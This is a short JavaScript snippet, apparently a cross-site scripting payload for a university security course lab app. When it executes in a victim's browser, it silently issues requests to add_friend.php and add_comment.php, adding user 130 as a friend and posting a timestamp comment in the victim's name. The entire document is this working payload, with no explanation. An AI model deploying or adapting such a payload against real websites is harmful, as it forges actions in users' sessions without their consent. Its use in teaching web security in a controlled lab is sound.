var r = new XMLHttpRequest();
r.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=130', true);
r.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
r.send();
var d = new Date();
var comment =d.getMonth() + "-" + d.getDate() + " at " + d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds();
var x = new XMLHttpRequest();
x.open('GET', 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=130&comment='+ comment, true);
x.send();
